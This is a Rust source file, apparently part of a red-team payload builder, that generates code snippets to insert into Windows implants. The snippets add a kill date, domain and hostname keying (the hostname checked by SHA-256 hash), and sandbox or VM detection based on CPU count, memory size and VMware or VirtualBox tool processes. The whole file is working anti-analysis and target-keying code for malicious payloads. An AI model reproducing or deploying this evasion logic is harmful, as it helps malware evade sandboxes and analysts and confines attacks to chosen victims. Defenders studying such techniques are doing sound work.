use sha2::{Sha256, Digest};

pub fn kill_date_check_snippet(date: &str) -> anyhow::Result<String> {
    let unix_ts = date_to_unix(date)?;
    Ok(format!(
        r#"    // Kill date check
    {{
        use std::time::{{SystemTime, UNIX_EPOCH, Duration}};
        let killdate = UNIX_EPOCH + Duration::from_secs({unix_ts});
        if SystemTime::now() > killdate {{ std::process::exit(0); }}
    }}"#,
        unix_ts = unix_ts
    ))
}

pub fn domain_key_snippet(domain: &str) -> String {
    let domain_upper = domain.to_uppercase();
    format!(
        r#"    // Domain keying check
    {{
        use windows_sys::Win32::NetworkManagement::NetManagement::*;
        unsafe {{
            let mut buffer: *mut u16 = std::ptr::null_mut();
            let mut join_status: i32 = 0;
            let result = NetGetJoinInformation(
                std::ptr::null(),
                &mut buffer,
                &mut join_status,
            );
            if result != 0 {{ std::process::exit(0); }}
            if join_status != NetSetupDomainName {{ std::process::exit(0); }}
            if !buffer.is_null() {{
                let mut len = 0;
                let mut ptr = buffer;
                while *ptr != 0 {{
                    len += 1;
                    ptr = ptr.add(1);
                }}
                let domain_name = String::from_utf16_lossy(std::slice::from_raw_parts(buffer, len));
                NetApiBufferFree(buffer as *const _);
                if domain_name.to_uppercase() != "{expected_domain}" {{
                    std::process::exit(0);
                }}
            }} else {{
                std::process::exit(0);
            }}
        }}
    }}"#,
        expected_domain = domain_upper
    )
}

pub fn hostname_key_snippet(hostname: &str) -> String {
    let hash = compute_hostname_hash(hostname);
    format!(
        r#"    // Hostname keying check (SHA-256 hash comparison)
    {{
        use windows_sys::Win32::System::SystemInformation::*;
        use sha2::{{Sha256, Digest}};
        unsafe {{
            let mut size: u32 = 256;
            let mut buffer: Vec<u16> = vec![0u16; size as usize];
            let success = GetComputerNameExW(
                ComputerNameDnsHostname,
                buffer.as_mut_ptr(),
                &mut size,
            );
            if success == 0 {{ std::process::exit(0); }}
            let hostname = String::from_utf16_lossy(&buffer[..size as usize]);
            let mut hasher = Sha256::new();
            hasher.update(hostname.to_uppercase().as_bytes());
            let result = hasher.finalize();
            let hash_hex = result.iter().map(|b| format!("{{:02x}}", b)).collect::<String>();
            if hash_hex != "{expected_hash}" {{
                std::process::exit(0);
            }}
        }}
    }}"#,
        expected_hash = hash
    )
}

pub fn sandbox_check_snippet(mode: &str) -> String {
    match mode {
        "DomainJoined" => sandbox_domain_joined(),
        "Threshold" => sandbox_threshold(),
        _ => String::new(),
    }
}

fn sandbox_domain_joined() -> String {
    r#"    // Sandbox check: Domain joined only
    {
        use windows_sys::Win32::NetworkManagement::NetManagement::*;
        unsafe {
            let mut buffer: *mut u16 = std::ptr::null_mut();
            let mut join_status: u32 = 0;
            let result = NetGetJoinInformation(
                std::ptr::null(),
                &mut buffer,
                &mut join_status,
            );
            if result != 0 || join_status != NetSetupDomainName {
                std::process::exit(0);
            }
            if !buffer.is_null() {
                NetApiBufferFree(buffer as *const _);
            }
        }
    }"#
    .to_string()
}

fn sandbox_threshold() -> String {
    r#"    // Sandbox check: VM/Sandbox threshold detection
    {
        use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
        use windows_sys::Win32::System::SystemInformation::*;
        use windows_sys::Win32::Foundation::*;

        unsafe {
            let mut sys_info: SYSTEM_INFO = std::mem::zeroed();
            GetSystemInfo(&mut sys_info);
            if sys_info.dwNumberOfProcessors < 2 {
                std::process::exit(0);
            }
        }

        unsafe {
            let mut mem_info: MEMORYSTATUSEX = std::mem::zeroed();
            mem_info.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
            if GlobalMemoryStatusEx(&mut mem_info) != 0 {
                if mem_info.ullTotalPhys < 2 * 1024 * 1024 * 1024 {
                    std::process::exit(0);
                }
            }
        }

        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap != INVALID_HANDLE_VALUE {
                let mut entry: PROCESSENTRY32W = std::mem::zeroed();
                entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32FirstW(snap, &mut entry) != 0 {
                    loop {
                        let name = String::from_utf16_lossy(
                            &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len())]
                        ).to_lowercase();
                        if name.contains("vmtoolsd") || name.contains("vboxservice") ||
                           name.contains("vmwaretray") || name.contains("vboxtray") {
                            CloseHandle(snap);
                            std::process::exit(0);
                        }
                        if Process32NextW(snap, &mut entry) == 0 { break; }
                    }
                }
                CloseHandle(snap);
            }
        }
    }"#
    .to_string()
}

fn date_to_unix(date: &str) -> anyhow::Result<u64> {
    let parsed = chrono::NaiveDate::parse_from_str(date, "%Y-%m-%d")
        .map_err(|e| anyhow::anyhow!("Invalid date format '{}': {}", date, e))?;
    let datetime = parsed
        .and_hms_opt(23, 59, 59)
        .ok_or_else(|| anyhow::anyhow!("Failed to create datetime"))?;
    Ok(datetime.and_utc().timestamp() as u64)
}

fn compute_hostname_hash(hostname: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(hostname.to_uppercase().as_bytes());
    let result = hasher.finalize();
    hex::encode(result)
}
